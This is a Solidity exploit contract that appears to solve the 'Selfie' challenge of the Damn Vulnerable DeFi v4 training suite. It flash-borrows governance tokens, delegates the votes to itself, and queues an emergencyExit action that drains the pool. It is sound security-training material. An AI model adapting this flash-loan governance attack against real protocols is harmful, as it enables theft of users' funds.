// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";

import {console} from "forge-std/console.sol";
contract SelfieExploiter is IERC3156FlashBorrower {

    address public recovery;

    SimpleGovernance public governance;
    SelfiePool public pool;

    constructor(SelfiePool _pool, SimpleGovernance _governance, address _recovery) {
        pool = _pool;
        governance = _governance;
        recovery = _recovery;
    }

    function onFlashLoan(
        address sender,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        
        console.log("current holding of token: %s", DamnValuableVotes(token).balanceOf(address(this)));
        DamnValuableVotes(token).delegate(address(this));

        console.log("current holding of token: %s", DamnValuableVotes(token).balanceOf(address(this)));

        governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );

        DamnValuableVotes(token).approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function exploit() external {

        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(pool.token()),
            pool.maxFlashLoan(address(pool.token())),
            ""
        );
    }
}
